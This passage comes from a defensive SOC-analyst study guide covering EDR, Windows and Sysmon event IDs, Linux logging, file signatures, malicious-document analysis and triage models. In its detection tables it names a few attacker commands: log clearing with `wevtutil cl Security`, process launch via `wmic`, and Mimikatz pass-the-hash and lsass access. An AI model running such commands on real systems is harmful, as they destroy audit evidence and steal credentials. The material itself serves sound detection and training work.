| **`wmic.exe`** | WMI Management | Process execution, remote reconnaissance, software enumeration. | `wmic process call create "cmd.exe"`. |

---

### Module 3.2 — Endpoint Defense in Depth & EDR Architecture

#### 1. Antivirus (EPP) vs Endpoint Detection and Response (EDR)

Defensive endpoint architecture has evolved beyond signature-based file scanners:

| Feature | Legacy Antivirus (EPP) | Modern Endpoint Detection and Response (EDR/XDR) |
|---------|------------------------|--------------------------------------------------|
| **Detection Method** | Static file hashes, string signatures, basic heuristics. | Continuous behavioral telemetry, process lineage, memory hooks, ML models. |
| **Operational Focus** | **Prevention only:** Block known malware on file write/read. | **Detection, Investigation & Response:** Record everything; detect novel attacks. |
| **Historical Telemetry**| None. No record of process executions or connections. | Full historical recording: Every process execution, network socket, file creation. |
| **Response Actions** | Quarantine or delete the flagged file. | Remote live shell, process termination, network isolation, memory dump collection. |
| **Adversary Resilience**| Trivial to evade: Modify 1 byte of code to change file hash. | Hard to evade: Bypassing requires evading behavioral patterns and kernel sensors. |

---

#### 2. EDR Architectural Mechanics: Kernel vs Userland

How EDR agents achieve deep host visibility:

- **Kernel-Mode Driver (ELAM / Filter Drivers):**
  - Operates at **Ring 0** (kernel space).
  - Intercepts system calls, process creation notifications (`PsSetCreateProcessNotifyRoutine`), thread creation, and image loading.
  - Immune to tampering by standard userland applications and protected from unprivileged administrator shutdown.
- **Userland Hooking:**
  - EDR injects a monitoring DLL into every running process at startup.
  - Hooks sensitive Windows API functions in `ntdll.dll` and `kernel32.dll` (e.g., `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`) to inspect parameters before execution proceeds.
- **Antimalware Scan Interface (AMSI):**
  - An interface allowing applications (PowerShell, VBScript, JScript, .NET, Office VBA) to pass scripts to the installed antivirus/EDR engine in plain-text *immediately prior to execution*, defeating runtime obfuscation and Base64 encoding.

---

#### 3. Microsoft Sysmon (System Monitor)

Sysmon is a free, enterprise-grade Windows system service and device driver that logs detailed host activity directly into the Windows Event Log:

- **Log Channel:** `Microsoft-Windows-Sysmon/Operational`
- **Configuration Schema:** Highly customizable XML file defining precise inclusions and exclusions based on process names, command-line arguments, file paths, and hashes.
- **Value in the SOC:** Bridges the gap between basic Windows security auditing and commercial EDR solutions, providing full SHA-256 process hashing and network connection binding.

---

### Module 3.3 — Windows Logging Architecture & Critical Event IDs

#### 1. Windows Event Log System Architecture

The Windows Event Log subsystem is structured around standardized XML records:

- **Log Channels:**
  - **Security (`%SystemRoot%\System32\Winevt\Logs\Security.evtx`):** Audits authentication, privilege use, policy changes, process execution. Requires administrative access to view.
  - **System (`System.evtx`):** Windows operating system components, driver failures, service installations.
  - **Application (`Application.evtx`):** Software application error logs, crash events, database notices.
  - **Applications and Services Logs:** Granular, dedicated event logs for individual Windows components (PowerShell, TaskScheduler, CodeIntegrity, Sysmon).

![Advanced Audit Policy Configuration in Local Security Policy](/images/cheatSheets/sec450/book3-p59-windows-logging-1.png)

*Advanced Audit Policy Configuration in Local Security Policy*

![Event 4624 in XML view showing the structured EventData fields](/images/cheatSheets/sec450/book3-p61-windows-logging-3.png)

*Event 4624 in XML view showing the structured EventData fields*

![Event Viewer log tree: commonly logged Windows logs versus less commonly logged Applications and Services logs](/images/cheatSheets/sec450/book3-p66-windows-logging-1.jpeg)

*Event Viewer log tree: commonly logged Windows logs versus less commonly logged Applications and Services logs*

---

#### 2. Master Table of Critical Windows Security Event IDs

Every security analyst must memorize these essential Windows Security Event IDs:

| Event ID | Event Name | Blue Team Operational Analysis & Investigation Significance |
|----------|------------|-------------------------------------------------------------|
| **4624** | Successful Logon | Analyzed for **Logon Type**, Target User, Source IP, and Workstation Name. |
| **4625** | Failed Logon | Indicates password spraying, brute force, or credential mistyping. Check Status/Substatus codes. |
| **4688** | Process Creation | **The most critical event!** Shows parent process, child process, and full command line (when enabled). |
| **4672** | Special Privileges Assigned | Fired immediately after 4624 when an administrator or high-privilege account logs on. |
| **4720** | User Account Created | Unauthorized account creation indicates adversary establishing backdoor persistence. |
| **4726** | User Account Deleted | Adversary covering tracks or removing temporary staging accounts. |
| **4728** | Member Added to Global Group | Critical! Detects users being added to high-privilege groups (`Domain Admins`). |
| **4732** | Member Added to Local Group | Detects users being added to local `Administrators` or `Remote Desktop Users` group. |
| **4756** | Member Added to Universal Group | Detects users being added to `Enterprise Admins` or `Schema Admins`. |
| **7045** | Service Installed (System Log) | Detects new services installed (e.g., PsExec installing `PSEXESVC.exe`, ransomware persistence). |
| **4697** | Service Installed (Security Log) | Security log equivalent of 7045; captures service filename and account context. |
| **4698** | Scheduled Task Created | Detects scheduled task persistence (`schtasks.exe /create`). |
| **1102** | Audit Log Cleared | Catastrophic indicator! Adversary executing `wevtutil cl Security` to destroy evidence. |
| **4738** | User Account Modified | Detects password resets, account lockout removals, or UserAccountControl flag modifications. |

---

#### 3. Windows Logon Types (Event 4624 & 4625)

Decoding the **Logon Type** field in Event 4624 reveals *how* the user authenticated:

| Logon Type | Name | Meaning & Investigation Context |
|------------|------|---------------------------------|
| **Type 2** | **Interactive** | User physically typed username/password at the local keyboard/console. Normal for local workstations; suspicious if seen on remote data center servers. |
| **Type 3** | **Network** | Authentication over the network (e.g., accessing a shared folder, mapping a drive, connecting via SMB/RPC, connecting to IIS web server). Normal for file servers; suspicious for lateral movement between workstations. |
| **Type 4** | **Batch** | Scheduled task or batch script execution running on behalf of a user. |
| **Type 5** | **Service** | Windows Service starting up with a configured service account. |
| **Type 7** | **Unlock** | User unlocked a previously locked workstation console. |
| **Type 8** | **NetworkCleartext** | Password sent across network in cleartext (e.g., basic HTTP auth, IIS basic authentication). |
| **Type 9** | **NewCredentials** | User ran a program with `/netonly` flag (e.g., `runas /netonly` or Mimikatz `sekurlsa::pth`). Local identity remains unchanged, but outbound network connections use the new credentials! |
| **Type 10** | **RemoteInteractive** | User logged on via **Remote Desktop (RDP)**, Terminal Services, or Remote Assistance. Check source IP! |
| **Type 11** | **CachedInteractive** | User logged on locally using cached credentials because the Domain Controller was unreachable (e.g., traveling laptop). |

![Event 4624 with Logon Type, New Logon account, Workstation Name, and Source Network Address highlighted](/images/cheatSheets/sec450/book3-p82-interpreting-events-1.png)

*Event 4624 with Logon Type, New Logon account, Workstation Name, and Source Network Address highlighted*

---

#### 4. Failed Logon Status Codes (Event 4625)

The `Status` and `Substatus` hex codes reveal the exact root cause of authentication failure:

| Status Code | Substatus Code | Error Meaning | Operational Threat Assessment |
|-------------|----------------|---------------|-------------------------------|
| `0xC000006D` | `0xC000006A` | **Bad Password** | Valid username, but wrong password entered. Multiple events across many users = password spraying. Multiple events on single user = brute force. |
| `0xC000006D` | `0xC0000064` | **User Does Not Exist** | Username entered does not exist in Active Directory. Common during broad automated dictionary attacks. |
| `0xC000006D` | `0xC0000234` | **Account Locked Out** | User exceeded maximum failed login attempts threshold. High volume across org indicates aggressive attack. |
| `0xC000006D` | `0xC0000072` | **Account Disabled** | Attempt to log in with a previously disabled administrative or contractor account. |
| `0xC000006D` | `0xC0000193` | **Account Expired** | Attempt to log in using an expired Active Directory account. |

---

#### 5. Master Table of Critical Sysmon Event IDs

Sysmon provides granular execution and network binding events:

| Sysmon ID | Event Description | Blue Team Operational Analysis & Threat Hunting Value |
|-----------|-------------------|-------------------------------------------------------|
| **Event 1** | **Process Create** | Records parent process, command-line arguments, hashes (SHA256, MD5), user context, and integrity level. |
| **Event 3** | **Network Connection** | Associates outbound and inbound TCP/UDP network connections directly with the specific executable filename and process ID. |
| **Event 5** | **Process Terminated** | Tracks process termination; useful for identifying anti-forensic killing of security agents. |
| **Event 7** | **Image Loaded (DLL)** | Tracks DLLs loaded into processes; critical for detecting DLL Search Order Hijacking and DLL Side-Loading. |
| **Event 8** | **CreateRemoteThread** | High-severity event! Detects process injection where one process creates a thread inside another process (e.g., malware injecting into `svchost.exe` or `explorer.exe`). |
| **Event 10** | **ProcessAccess** | Detects processes opening handles to other processes. **Primary detection for Mimikatz opening handles to `lsass.exe` with `PROCESS_VM_READ` access rights!** |
| **Event 11** | **FileCreate** | Tracks file creation timestamps and paths (e.g., dropping malware into `C:\Users\Public` or `C:\ProgramData`). |
| **Event 12/13/14** | **Registry Modification** | Tracks registry key and value creation, deletion, and modification. Detects Run keys, service additions, and policy tampering. |
| **Event 22** | **DNSEvent (DNS Query)** | Records DNS queries issued directly by applications on the host, binding the domain lookup to the originating process! |

---

#### 6. Reading Event Examples

Annotated events from the course, with the fields to read first:

- **Event 4648 (explicit credentials):** Compare the calling account with the account whose credentials were used, then check the target server.

![Event 4648: the calling account, the account whose credentials were used, and the target server](/images/cheatSheets/sec450/book3-p84-interpreting-events-1.png)

*Event 4648: the calling account, the account whose credentials were used, and the target server*

- **Event 4688 (process creation):** Read the process command line and the creator process name.

![Event 4688: new process, creator process, and process command line](/images/cheatSheets/sec450/book3-p88-interpreting-events-1.jpeg)

*Event 4688: new process, creator process, and process command line*

- **Sysmon Event 1 (process creation):** Adds file hashes and full parent process details to the command line.

![Sysmon Event 1: command line, hashes, and parent process details](/images/cheatSheets/sec450/book3-p88-interpreting-events-2.jpeg)

*Sysmon Event 1: command line, hashes, and parent process details*

- **Event 4698 (scheduled task created):** Read the task name, the author, and the command in the `Exec` action.

![Event 4698: scheduled task name, author, and the command it executes](/images/cheatSheets/sec450/book3-p96-interpreting-events-1.png)

*Event 4698: scheduled task name, author, and the command it executes*

- **Event 4104 (PowerShell script block):** Captures the script text in the `Microsoft-Windows-PowerShell/Operational` log.

![Event 4104: PowerShell script block text in the Operational log](/images/cheatSheets/sec450/book3-p101-interpreting-events-1.jpeg)

*Event 4104: PowerShell script block text in the Operational log*

- **Events 4768 and 4769 (Kerberos):** 4768 records a TGT request (service name `krbtgt`); 4769 records a service ticket request. Check the account, service name, client address, and result or failure code.

![Event 4768: Kerberos TGT request with account, service name, client address, and result code](/images/cheatSheets/sec450/book3-p106-interpreting-events-1.png)

*Event 4768: Kerberos TGT request with account, service name, client address, and result code*

![Event 4769: Kerberos service ticket request with service name, client address, and failure code](/images/cheatSheets/sec450/book3-p107-interpreting-events-1.png)

*Event 4769: Kerberos service ticket request with service name, client address, and failure code*

- **Windows Defender Event 1116 (malware detected):** Read the detection name, the affected path, and the process involved.

![Windows Defender Event 1116: detection name, path, and responsible process](/images/cheatSheets/sec450/book3-p100-interpreting-events-1.png)

*Windows Defender Event 1116: detection name, path, and responsible process*

---

### Module 3.4 — Linux Logging Architecture & Syslog

#### 1. Syslog Standard Architecture (RFC 5424)

Linux and Unix systems rely on the Syslog protocol for standardized operational logging:

- **Syslog Facility Codes:** Indicates the subsystem that generated the event:
  - `auth` / `authpriv:` Security and authentication messages.
  - `cron:` Scheduled clock daemon tasks.
  - `daemon:` System background daemons without dedicated facilities.
  - `kern:` Linux kernel messages.
  - `mail:` Mail system messages.
  - `syslog:` Internal messages generated by syslogd itself.
  - `local0` through `local7:` Locally defined custom applications.
- **Syslog Severity Levels (0–7):**
  - `0 - Emergency:` System is unusable (panic).
  - `1 - Alert:` Action must be taken immediately.
  - `2 - Critical:` Critical conditions.
  - `3 - Error:` Error conditions.
  - `4 - Warning:` Warning conditions.
  - `5 - Notice:` Normal but significant condition.
  - `6 - Informational:` Informational messages.
  - `7 - Debug:` Debug-level messages.

![Syslog message (AUTHPRIV.INFO) captured in Wireshark](/images/cheatSheets/sec450/book3-p73-linux-logging-1.jpeg)

*Syslog message (AUTHPRIV.INFO) captured in Wireshark*

---

#### 2. Master Table of Critical Linux Log File Locations

Standard paths across Debian/Ubuntu and RedHat/CentOS distributions:

| Log File Path | Primary Distribution | Logging Content & SOC Investigation Value |
|---------------|----------------------|-------------------------------------------|
| **`/var/log/auth.log`** | Debian, Ubuntu | User authentication, SSH logins, `sudo` elevation commands, PAM authentication failures. |
| **`/var/log/secure`** | RHEL, CentOS, Fedora | Identical to `auth.log`; records SSH logins, failed passwords, root escalations. |
| **`/var/log/messages`** | RHEL, CentOS, Fedora | General system activity, service startups, network interface changes, non-auth events. |
| **`/var/log/syslog`** | Debian, Ubuntu | Central system log capturing everything except authentication data. |
| **`/var/log/audit/audit.log`** | All Linux (auditd) | Deep kernel audit framework log: tracks system calls (`execve`), file access, user transitions. |
| **`/var/log/boot.log`** | All Linux | System startup messages and hardware initialization. |
| **`/var/log/dmesg`** | All Linux | Kernel ring buffer messages; hardware detection, driver load events. |
| **`/var/log/cron`** | RHEL, CentOS | Execution history of scheduled cron jobs (`crontab`). |
| **`/var/log/wtmp` & `/var/log/utmp`** | All Linux | Binary files recording user login sessions. Read via `last` and `who` commands. |
| **`/var/log/btmp`** | All Linux | Binary file recording failed login attempts. Read via `lastb` command. |

---

#### 3. The systemd Journal & Linux Audit Framework (auditd)

Modern Linux distributions employ advanced logging subsystems:

- **`systemd-journald`:**
  - Ingests logs from kernel, early boot, stdout/stderr of services, and syslog.
  - Stores logs in an indexed, binary format (`/var/log/journal/`).
  - Query command: `journalctl`
    ```bash
    journalctl -u ssh.service -S today     # View today's SSH events
    journalctl -f                          # Follow logs in real-time
    journalctl -p err                      # View only error-level messages
    ```
- **Linux Audit Subsystem (`auditd`):**
  - Operates inside the Linux kernel to intercept system calls.
  - Generates immutable records of execution, file modifications, and permission shifts.
  - Query tools: `ausearch` and `aureport`
    ```bash
    ausearch -m USER_AUTH -ts today       # Search authentication events today
    ausearch -sc execve -i                # Search process executions with human-readable args
    aureport -au                          # Generate authentication summary report
    ```

---

### Module 3.5 — Centralized Log Collection, Normalization, and Pipeline

#### 1. Centralized Log Pipeline Architecture

Enterprise log pipelines ingest millions of events per second across thousands of endpoints:

```
[Endpoints (Win/Linux)] --> [Shipper Agents (Beats/Fluentd)] --> [Message Queue (Kafka)] --> [Parsers (Logstash)] --> [Storage (Elasticsearch)]
```

- **Collection Tier (Agents):** Lightweight shippers installed on hosts (Winlogbeat, Filebeat). Must consume minimal CPU (<2%) and support spooling to disk if network connectivity drops.
- **Buffering Tier (Message Queue):** Technologies like Apache Kafka or Redis act as shock absorbers. Prevents downstream indexing nodes from crashing during sudden log spikes (e.g., active network incident).
- **Processing Tier (Logstash / Vector):** Ingests raw strings, applies regex / grok patterns to extract fields, enriches data, and normalizes field names.
- **Storage and Indexing Tier (Elasticsearch):** Distributed document store indexing normalized JSON events for instant query retrieval.

---

#### 2. Normalization & The Elastic Common Schema (ECS)

Without a unified schema, correlation across diverse log sources is impossible:

- **The Normalization Challenge:**
  - Check Point firewall calls source IP: `src`
  - Cisco ASA calls source IP: `src_ip`
  - Windows Event Log calls source IP: `IpAddress`
  - Zeek calls source IP: `id.orig_h`
  - Apache calls source IP: `clientip`
- **Elastic Common Schema (ECS) Solution:** Standardizes all source IP addresses to a single canonical field name: **`source.ip`**.
- **Essential ECS Field Categories:**
  - `source.*` / `destination.*` (`source.ip`, `source.port`, `source.bytes`)
  - `host.*` (`host.name`, `host.ip`, `host.os.version`)
  - `user.*` (`user.name`, `user.domain`, `user.id`)
  - `process.*` (`process.name`, `process.pid`, `process.command_line`, `process.parent.name`)
  - `event.*` (`event.category`, `event.action`, `event.outcome`, `event.dataset`)

---

#### 3. Timezone Management & Ingestion Challenges

Timestamp inaccuracies undermine incident timelines:

- **The Universal Standard:** All logs ingested into the SIEM **must be converted to UTC (Coordinated Universal Time / Zulu)** at ingestion time.
- **Drift Detection:** Out-of-sync system clocks cause events to appear in the future or hours in the past, completely scrambling correlation searches. All enterprise systems must synchronize via Network Time Protocol (NTP).

---

### Module 3.6 — File Contents, Types, and Identification

#### 1. Magic Numbers vs File Extensions

Attackers frequently disguise malicious executables by renaming file extensions (e.g., renaming `malware.exe` to `invoice.pdf`):

- **Operating System Traps:** Windows displays file extensions based on user settings and binds execution to file extensions or shell associations.
- **Defensive Reality:** The true identity of a file is defined by its **Magic Bytes (File Header Signature)**—the initial bytes located at offset `0x00` of the file payload.

![Hex dump of a file containing structures from more than one file format](/images/cheatSheets/sec450/book3-p137-file-contents-1.png)

*Hex dump of a file containing structures from more than one file format*

---

#### 2. Master Table of Critical File Signatures (Magic Bytes)

Every analyst must recognize these binary headers:

| Magic Bytes (Hex) | ASCII / String | True File Type | Investigation Significance |
|-------------------|----------------|----------------|----------------------------|
| **`4D 5A`** | `MZ` | **Windows PE Executable** (EXE, DLL, SYS, OCX) | If seen in a file named `.pdf` or `.png`, it is disguised executable malware! |
| **`50 4B 03 04`** | `PK..` | **ZIP Compressed Archive** | Base format for modern Microsoft Office documents (`.docx`, `.xlsx`, `.pptx`), Android APKs, and JAR files. |
| **`25 50 44 46`** | `%PDF` | **Adobe PDF Document** | Adobe Acrobat format; look for embedded JavaScript (`/JS`) or launch actions (`/Launch`). |
| **`7F 45 4C 46`** | `.ELF` | **Linux Executable** (ELF Binary) | Standard executable and shared library format on Linux systems. |
| **`D0 CF 11 E0 A1 B1 1A E1`** | `Docfile` | **Legacy MS Compound File (OLE2)** | Legacy Office documents (`.doc`, `.xls`, `.ppt`). Frequently carries malicious VBA macros. |
| **`FF D8 FF`** | `...` | **JPEG Image** | Standard image format; check for appended data beyond the `FF D9` EOF marker. |
| **`89 50 4E 47 0D 0A 1A 0A`** | `.PNG....` | **PNG Image** | Standard image format; check for steganography or payload hiding. |
| **`52 61 72 21 1A 07`** | `Rar!..` | **RAR Compressed Archive** | Frequently used by threat actors to exfiltrate bulk stolen files. |
| **`47 49 46 38 37 61` / `39 61`** | `GIF87a` / `GIF89a` | **GIF Image** | Web graphics; abused for webshell hiding (GIF header prepended to PHP script). |

![Hex dump of a PDF showing the %PDF-1.4 header](/images/cheatSheets/sec450/book3-p133-file-contents-1.png)

*Hex dump of a PDF showing the %PDF-1.4 header*

![Hex dump of an executable showing the MZ header and the DOS stub message](/images/cheatSheets/sec450/book3-p142-file-contents-1.png)

*Hex dump of an executable showing the MZ header and the DOS stub message*

---

#### 3. Cryptographic and Fuzzy Hashing

Hashes provide unique digital fingerprints for file identification:

- **Cryptographic Hashes (MD5, SHA-1, SHA-256):**
  - Exhibit the **avalanche effect**: Changing a single bit in the file results in an entirely different hash value.
  - Used for exact match lookups against VirusTotal, threat intelligence feeds, and NSRL databases.
- **Fuzzy Hashing (SSDEEP / Context Triggered Piecewise Hashing - CTPH):**
  - Calculates hashes of small chunks throughout the file and concatenates the results.
  - Produces a similarity percentage score (0%–100%) between two files.
  - **Blue Team Value:** Detects polymorphic malware variants where the attacker modified small strings or recompiled the binary to alter the SHA-256 hash.

---

#### 4. Shannon Entropy in Malware Analysis

Entropy measures the degree of mathematical randomness within a data stream:

- **Entropy Scale:** Ranges from **0.0** (completely uniform, e.g., all null bytes) to **8.0** (completely random data).
- **Plaintext Code / Text Files:** Typically scores between **3.5 and 5.0**.
- **Packed, Compressed, or Encrypted Files:** Scores between **7.0 and 8.0**.
- **Detection Heuristic:** An executable binary containing a `.text` or resource section with entropy > **7.2** strongly indicates the binary is **packed with an obfuscator (UPX, Themida) or contains an encrypted shellcode payload**.

---

### Module 3.7 — Identifying and Handling Suspicious Files

#### 1. Portable Executable (PE) File Anatomy

The PE format governs executables (`.exe`), DLLs, and drivers on Windows systems:

- **DOS Header:** Starts with magic bytes `MZ` (`0x5A4D`). Contains the legacy DOS stub: *"This program cannot be run in DOS mode."*
- **PE Header:** Starts at offset indicated by `e_lfanew` with magic bytes `PE\0\0`. Contains:
  - **COFF File Header:** Specifies target machine architecture (x86 vs x64), number of sections, and compile `TimeDateStamp`.
  - **Optional Header:** Defines entry point RVA (Relative Virtual Address), subsystem (GUI vs Console), and security flags (ASLR, DEP, CFG).
- **Section Headers & Tables:**
  - `.text:` Contains the compiled machine instructions (code). Should have execute and read permissions (`RX`), but **never write (`W`)**!
  - `.data:` Global and static initialized variables (`RW`).
  - `.rsrc:` Application resources (icons, dialogue boxes, embedded strings, embedded secondary executables).
- **Anomalous PE Indicators:**
  - Section with `W` and `X` permissions simultaneously (Read/Write/Execute - W^X violation; indicates self-modifying code / unpacking).
  - Compile timestamp in the future or set to Unix epoch (`1970-01-01`).
  - Missing digital signature or signed by an untrusted / self-signed certificate.

![sigcheck output for calc.exe: signature status, publisher, hashes, entropy, and VirusTotal detection ratio](/images/cheatSheets/sec450/book3-p165-suspicious-files-1.png)

*sigcheck output for calc.exe: signature status, publisher, hashes, entropy, and VirusTotal detection ratio*

---

#### 2. Malicious Office Document Analysis (oletools)

Microsoft Office files remain the primary delivery vehicle for email malware:

- **VBA Macro Execution Triggers:**
  - `AutoOpen()`, `Workbook_Open()`, `Document_Open()` execute automatically when the victim enables content.
- **Static Analysis with `oletools` (Didier Stevens & Philippe Lagadec):**
  - **`oleid <file>:`** Quick scan determining file format and whether VBA macros are present.
  - **`mraptor <file>:`** Macro Raptor; evaluates macro heuristics for malicious behavior (e.g., suspicious auto-executing triggers + command execution).
  - **`olevba <file>:`** Extracts and analyzes VBA source code, automatically flagging obfuscation, suspicious function calls (`Shell`, `CreateObject("WScript.Shell")`, `Environ`, `URLDownloadToFile`), and Base64-encoded strings.

```bash
# Analyze suspicious Office document with olevba:
olevba -c suspicious_invoice.docm

# Extract embedded streams and macro payloads:
oledump.py suspicious_invoice.docm -s 7 -v
```

![Phishing lure impersonating a OneDrive secured document](/images/cheatSheets/sec450/book3-p158-suspicious-files-2.png)

*Phishing lure impersonating a OneDrive secured document*

![Office document lure instructing the victim to enable editing and content](/images/cheatSheets/sec450/book3-p167-suspicious-files-3.png)

*Office document lure instructing the victim to enable editing and content*

![Obfuscated VBA macro code with randomized identifiers](/images/cheatSheets/sec450/book3-p168-suspicious-files-1.png)

*Obfuscated VBA macro code with randomized identifiers*

![Obfuscated JavaScript with array-indexed string lookups](/images/cheatSheets/sec450/book3-p168-suspicious-files-2.png)

*Obfuscated JavaScript with array-indexed string lookups*

---

#### 3. Analyst OPSEC: Safe Handling of Malicious Files

Careless handling of malware can compromise the analyst's workstation or leak sensitive data:

- **Golden Rules for Malware Handling:**
  1. **Never Analyze on Production Host:** Always transfer suspicious files to an isolated, dedicated analysis virtual machine.
  2. **Disable Network Interfaces:** Set the analysis VM to *Host-Only* or *Internal Network* before executing code.
  3. **Calculate Hashes Immediately:** Compute MD5, SHA-1, and SHA-256 before modifying, moving, or opening the file.
  4. **Do NOT Upload Proprietary Files to Public VirusTotal:** Public submissions become accessible to all VirusTotal enterprise subscribers, potentially leaking sensitive customer data, proprietary source code, or NDA documents to the public!
  5. **Defang File Extensions:** Rename malicious files from `.exe` to `.exe.bin` or `.malware` to prevent accidental double-click execution.

---

## Book 4 — Triage and Analysis

> **SEC 450.4 — Triage and Analysis**

### Module 4.1 — Alert Triage and Prioritization

#### 1. The Art and Science of Triage

Triage is the initial sorting process designed to rapidly evaluate incoming alerts, discard noise, and prioritize confirmed threats:

- **Primary Goal:** Separate True Positives from False Positives within minutes, preventing queue congestion.
- **Triage Speed vs Depth:** Triage is *not* a full forensic investigation. Triage answers: *"Is this alert worthy of opening a full investigation case?"*
- **The Triage Decision Tree:**
  1. Inspect alert metadata: Rule name, triggering payload, source/destination IPs, host name, user account.
  2. Perform initial contextual validation: Does this user normally run PowerShell? Is this machine a domain controller or a receptionist laptop?
  3. Classify disposition: False Positive (close ticket, add tuning note) vs True Positive (escalate, open incident case).

![Alert counts by signature, with the rarest alert (PE EXE or DLL Windows file download) highlighted](/images/cheatSheets/sec450/book4-p22-alert-triage-1.jpeg)

*Alert counts by signature, with the rarest alert (PE EXE or DLL Windows file download) highlighted*

---

#### 2. Severity vs Priority Matrix

A fundamental operational distinction every SOC analyst must maintain:

- **Severity:** The theoretical technical impact of an exploit or alert condition in isolation (e.g., CVSS 9.8 Remote Code Execution).
- **Priority:** The operational urgency of investigating and responding to the alert, calculated by combining technical severity with **organizational context**:
  $$\text{Priority} = \text{Severity} \times \text{Asset Criticality} \times \text{Exposure Level}$$

| Alert Scenario | Technical Severity | Target Asset | Operational Priority | Action Required |
|----------------|--------------------|--------------|----------------------|-----------------|
| Cobalt Strike Beacon | **Critical** | Active Directory Domain Controller | **P1 - Immediate Critical** | Instant phone bridge; initiate immediate containment. |
| Cobalt Strike Beacon | **Critical** | Isolated Sandbox / Test VM | **P3 - Medium** | Verify isolation; analyze malware behavior. |
| Port Scan / Recon | **Low** | External Public DMZ Firewall | **P4 - Low / Informational** | Automated firewall drop log; no manual action. |
| Port Scan / Recon | **Low** | Internal Critical Database VLAN | **P2 - High** | Investigate source host immediately; internal lateral movement! |

---

#### 3. Alert Disposition Categories

Every closed alert must be classified with a precise disposition status:

- **True Positive — Malicious (TP-M):** Legitimate alert; malicious adversary activity confirmed. Requires remediation and incident documentation.
- **True Positive — Benign (TP-B):** The rule fired correctly on the specified condition, but the activity was authorized business operations (e.g., sysadmin running scheduled backup script via PowerShell). Rule is working as designed; requires whitelisting.
- **False Positive (FP):** The rule fired due to flawed logic, poor regex, or benign normal traffic mimicking malicious patterns. Requires immediate rule tuning.
- **Undetermined / Inconclusive:** Rare category; used when logs expired or evidence is insufficient to reach definitive conclusion.

---

### Module 4.2 — Perception, Memory, and Cognitive Biases in Investigation

#### 1. Dual-Process Cognitive Theory (Daniel Kahneman)

Human analytical judgment operates across two distinct cognitive operating modes:

- **System 1 (Fast Thinking):**
  - **Characteristics:** Automatic, intuitive, subconscious, effortless, emotional, extremely fast.
  - **Role in the SOC:** Recognizing familiar alert patterns, spotting obvious phishing domain anomalies.
  - **Failure Mode:** Highly vulnerable to cognitive biases, visual illusions, and premature conclusions.
- **System 2 (Slow Thinking):**
  - **Characteristics:** Deliberate, analytical, logical, conscious, effortful, computationally expensive.
  - **Role in the SOC:** Root cause analysis, evaluating competing hypotheses, reverse-engineering malware, dissecting complex multi-stage breaches.
  - **Failure Mode:** Easily exhausted by fatigue, hunger, stress, and continuous alert queues.

---

#### 2. Working Memory Limits & Miller's Law

The human brain is subject to strict physiological processing bottlenecks:

- **Miller's Law ($7 \pm 2$ Chunks):** Human working memory can hold only 5 to 9 discrete items simultaneously.
- **Analyst Implication:** An analyst attempting to juggle 10 IP addresses, 4 timestamps, 3 usernames, and 2 process IDs in their head *will inevitably make investigative errors*.
- **Operational Requirement:** Analysts must offload working memory onto external media: dedicated investigation scratchpads, timeline visualization tools, and case management software (TheHive).

---

#### 3. Cognitive Biases in Security Operations

Unconscious psychological traps that lead to flawed security assessments:

| Cognitive Bias | Psychological Mechanism | SOC Investigation Failure Example | Blue Team Countermeasure |
|----------------|-------------------------|-----------------------------------|--------------------------|
| **Confirmation Bias** | Seeking only data that confirms an initial suspicion while ignoring contradictory logs. | Analyst believes an alert is a false positive caused by a scanner; ignores outbound beaconing traffic from the same host. | Actively search for evidence that **disproves** your primary assumption. |
| **Anchoring Bias** | Over-relying on the first piece of information received. | Helpdesk user says *"My computer has a virus"*; analyst searches for malware instead of recognizing credentials were phished. | Re-evaluate the incident independently using objective log telemetry. |
| **Availability Heuristic** | Overestimating the probability of events that readily come to mind. | After analyzing a major ransomware breach, an analyst treats every failed service startup as a ransomware outbreak. | Rely on statistical baselines and objective diagnostic criteria. |
| **Premature Closure** | Halting an investigation as soon as a plausible explanation is found. | Finding an authorized administrator logged in and closing the case without realizing the administrator's account was compromised. | Mandatory checklist: confirm source IP, MFA status, and execution context. |

---

### Module 4.3 — Mental Models and Frameworks for InfoSec

#### 1. Lockheed Martin Cyber Kill Chain

A linear operational model mapping the stages of a targeted cyber attack:

```
[Reconnaissance] -> [Weaponization] -> [Delivery] -> [Exploitation] -> [Installation] -> [Command & Control] -> [Actions on Objectives]
```

- **Reconnaissance:** Harvesting email addresses, public DNS records, open ports, employee LinkedIn profiles.
- **Weaponization:** Coupling an exploit with a backdoor payload into a deliverable package (e.g., weaponized PDF/Office doc).
- **Delivery:** Transmitting the payload to the victim environment (email attachment, malicious URL, USB).
- **Exploitation:** Triggering code execution via application vulnerability or human interaction.
- **Installation:** Establishing a persistent backdoor or web shell on the victim asset.
- **Command and Control (C2):** Establishing an outbound communication channel to external infrastructure.
- **Actions on Objectives:** Fulfilling adversary goals: Data exfiltration, ransomware encryption, system destruction.
- **The Defender's Advantage:** Attackers must succeed in *every single step*; defenders can halt the breach by breaking *any single link* in the chain!

![Indicators mapped to attack phases: atomic (X-Mailer, filename) and computed (shellcode hash) indicators](/images/cheatSheets/sec450/book4-p47-models-concepts-1.jpeg)

*Indicators mapped to attack phases: atomic (X-Mailer, filename) and computed (shellcode hash) indicators*

---

#### 2. The Diamond Model of Intrusion Analysis (Caltagirone et al.)

A non-linear model emphasizing relational connections across four core vertices:

```
                        [ ADVERSARY ]
                       /             \
                      /               \
             [ INFRASTRUCTURE ] ---- [ CAPABILITY ]
                      \               /
                       \             /
                         [ VICTIM ]
```

- **Core Vertices:**
  - **Adversary:** The threat actor, sponsor, or organization behind the intrusion.
  - **Capability:** The malware, tools, exploits, and software used by the adversary.
  - **Infrastructure:** The IP addresses, domain names, C2 servers, email accounts, and communication paths.
  - **Victim:** The target organization, affected network, individual user, or asset.
- **Meta-Features:** Every Diamond event carries 6 meta-features:
  1. *Timestamp:* Exact date and time the activity occurred.
  2. *Phase:* The step in the Kill Chain represented by this event.
  3. *Result:* Success, failure, or unknown.
  4. *Direction:* Adversary-to-victim, victim-to-adversary, bidirectional.
  5. *Methodology:* Specific attack vector (phishing, drive-by, SQLi).
  6. *Confidence:* Analyst confidence score in the correlation.

![Diamond Model of intrusion analysis: adversary, infrastructure, capability, and victim, with meta-features](/images/cheatSheets/sec450/book4-p58-models-concepts-1.png)

*Diamond Model of intrusion analysis: adversary, infrastructure, capability, and victim, with meta-features*

---

#### 3. MITRE ATT&CK Framework

A globally accessible knowledge base of adversary tactics, techniques, and procedures (TTPs) based on real-world observations:

- **Hierarchy:**
